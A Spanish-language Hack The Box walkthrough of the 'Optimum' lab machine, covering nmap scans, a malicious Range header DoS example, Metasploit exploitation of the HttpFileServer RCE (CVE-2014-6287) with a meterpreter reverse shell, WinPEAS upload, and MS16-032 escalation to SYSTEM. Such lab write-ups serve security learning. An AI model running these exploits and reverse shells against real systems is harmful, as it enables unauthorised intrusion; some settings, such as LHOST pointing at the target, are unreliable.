---
{"-publish":true,"permalink":"/hack-the-box/machines/easy/optimum/","PassFrontmatter":true}
---

Empezamos haciendo un nmap para enumerar los sevicios existentes dentro de la maquina:

![[Pasted image 20250522180943.png\|Pasted image 20250522180943.png]]

Vemos que el unico puerto es el 80 (HTTB), lo cual significa que existe una pagina web detras.
- Por si acaso observamos la version del puerto 80 -> **80/tcp open  http    HttpFileServer httpd 2.3**

Ejecutamos un script de nmap para saber la vulnerablidad del puerto 80 y ver si detectamos algo.

```
nmap -p 80 --script http-vuln* 10.10.10.8
```

![[Pasted image 20250522181358.png\|Pasted image 20250522181358.png]]

#### Informacion extra:

| Script NSE                  | Descripción                                      |
| --------------------------- | ------------------------------------------------ |
| `http-vuln-cve2006-3392`    | Detecta una vulnerabilidad en Apache mod_rewrite |
| `http-vuln-cve2011-3192`    | Apache Range DoS                                 |
| `http-vuln-cve2017-5638`    | Apache Struts RCE                                |
| `http-vuln-cve2015-1635`    | Windows IIS RCE                                  |
| `http-vuln-cve2017-1001000` | Joomla RCE                                       |
| `http-dombased-xss.nse`     | XSS basado en DOM                                |
| `http-sql-injection.nse`    | Prueba SQLi básicas                              |
| `http-enum`                 | Enumera rutas comunes en servidores web          |
- Escaneo completo de versiones y vulnerabilidades

```
nmap -sV --script vuln -p 80 10.10.10.8
```

Lo que recibimos del comando es: CVE-2011-3192
- Esta vulnerabilidad es conocida como **Apache HTTPD "Range Header DoS" Vulnerability**

Descripcion:

- Afecta al servidor Apache HTTPD (versiones 2.0x y 2.2.x).
- Se debe a una mala gestion de cabeceras HTTP **Range**.
- Permite a un atacante remoto enviar una cabecera "Range" maliciosa que consume mucha memoria y CPU.
- Esto puede provocar un agotamiento de recursos y que el servidor deje de responder (Denegacion de Servicio).

Ejemplo de cabecera maliciosa:

```
Range: bytes=0-1,0-2,0-3,...,0-999999999
```

- Esto hace que Apache intente procesar miles de rangos, lo cual agota la memoria.

## Impacto

- No permite ejecucion de codigo ni acceso no autorizado.
- Solo provoca caida del servidor web (DoS).
- Puede ser explotado sin autenticacion
- Muy simple de ejcutar en versiones vulnerables.


Pero en esta caso para aprovechar un RCE, vamos usar el siguiente CVE: CVE-2014-6287

Descripcion:

- Afecta a versiones de HSF <= 2.3c
- Se debe a una falta de validacion en los parametros de una plantilla de scripting.
- Un atacante puede ejecutar comandos arbitrarios del sistema operativo a traves de una URL especialmente creada.

Tipo de vulnerabilidad: RCE (Remote Command Execution)

## Vamos a explotar la vulnerabilidad con Metasploit:

```
msfconsole

use exploit/windows/http/rejetto_hfs_exec
set RHOST 10.10.10.8
set RPORT 80
set LHOST ip
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

Encontramos el user.txt en kostas/Desktop/user.txt

![[Pasted image 20250522195207.png\|Pasted image 20250522195207.png]]

Procederemos a subir winpeas con metasploit:

Damos un:
- sysinfo

Este comando se usa principalmente en Meterpreter (Metasploit) para obtener informacion del sistema comprometido.

![[Pasted image 20250522195623.png\|Pasted image 20250522195623.png]]

Con esto podemos saber si el sistema es de 64 bits o 32 bits por ejemplo.

Descargaremos winpeas desde aqui: https://github.com/peass-ng/PEASS-ng/releases

![[Pasted image 20250522202517.png\|Pasted image 20250522202517.png]]

Usamos el comando de **upload /home/cesar/HTB/Optimum/winPEASx64.exe**, el cual fue la carpeta en la cual descargamos el winpeas en nuestro kali linux.
```
upload /home/cesar/HTB/Optimum/winPEASx64.exe C:\\Users\\kostas\\Desktop\\winpeas\\winpeas.exe
```

![[Pasted image 20250522202846.png\|Pasted image 20250522202846.png]]

Una vez lo hemos subido pasamos a ejecutarlo.

![[Pasted image 20250522202935.png\|Pasted image 20250522202935.png]]

Hemos encontrado default password en kostas:

![[Pasted image 20250522203527.png\|Pasted image 20250522203527.png]]


Nunca esta demas revisar las password por defecto de los usuarios.

Ahora procederemos a usar un modulo de metasploit  el cual es el de reconocimiento para enumerar posibles caminos de escala de privilegios en un sistema comprometido.

```
post/multi/recon/local_exploit_suggester
```

Este modulo te permite:

- Analizar el sistema comprometido para detectar vulnerabilidades locales que pueden permitir la escalada de privilegios.
- Basandose en la informacion del sistema (SO, parches, arquitectura), sugiere exploits locales disponibles.

Curiosidades: Aunque **local_exploit_suggester** y WinPEAS tienen propositos similares en cuanto a escalada de privilegios, no hacen lo mismo y tienen enfoques diferentes.

### **`local_exploit_suggester` (Metasploit)**

- 🔎 **Qué hace:**  
    Analiza el sistema para sugerir **exploits locales conocidos** (CVE) disponibles en Metasploit.
    
-  **Tipo de herramienta:**  
    Automatiza la búsqueda de **exploits existentes** basados en el sistema (versión de Windows, arquitectura, etc.).
    
-  **Dependencia:**  
    Necesita tener una sesión de Metasploit (por ejemplo, Meterpreter).
    
-  **Enfoque:**  
    Centrado en **vulnerabilidades explotables automáticamente**.

### **WinPEAS**

- **Qué hace:**  
    Enumera **todo lo relacionado con posibles vectores de escalada de privilegios**, como:
    
    - Servicios mal configurados
        
    - Permisos de archivos inseguros
        
    - Usuarios en grupos privilegiados
        
    - Contraseñas en texto plano
        
    - Auto-logon
        
    - Binaries vulnerables (privesc manual)
        
-  **Tipo de herramienta:**  
    Es una herramienta de **enumeración profunda**, **no explota** directamente nada.
    
-  **Dependencia:**  
    Es autónoma. Solo necesitas ejecutarla en el sistema comprometido.
    
-  **Enfoque:**  
    **Te da pistas** para que tú decidas qué técnica usar (manual o automatizada).


Pasos para usarlo:

```
meterpreter > Ctrl+Z
Background session 1? [y/N]  y
```

Nos salimos del meterpreter y damos lo siguiente:

```
sessions
```

![[Pasted image 20250522213209.png\|Pasted image 20250522213209.png]]
En mi caso eligire cualquiera de las dos sessiones ya que lo hice dos veces.

**set SESSION 3**

Luego damos **run** o **exploit** y se ejecutara.

![[Pasted image 20250522213313.png\|Pasted image 20250522213313.png]]


Despues de probar los paylodas, el que funciono es:

**exploit/windows/local/ms16_032_secondary_logon_handle_privesc**

Que es lo que hace exactamente? -> Esta vulnerabilidad permite al usuario local limitado obtener una shell como NT AUTHORITY\SYSTEM explotando como Windows maneja los handles del servicio de inicio de session secundario.

Requisitos:

- Tener una sesion Meterpreter activa como usuario limitado.
- Sistema vulnerable (comun en Windows 7, windows 8, Server 2008, etc.)
- Compatible con 32 y 64 bits.

Pasos:

```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION <id de tu session>
set LHOST 10.10.10.8
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

Despues usamos **shell** en el meterpreter y podemos acceder al administrator:

![[Pasted image 20250522230037.png\|Pasted image 20250522230037.png]]

Obtenemos la root.txt en el Administrator.

thanks.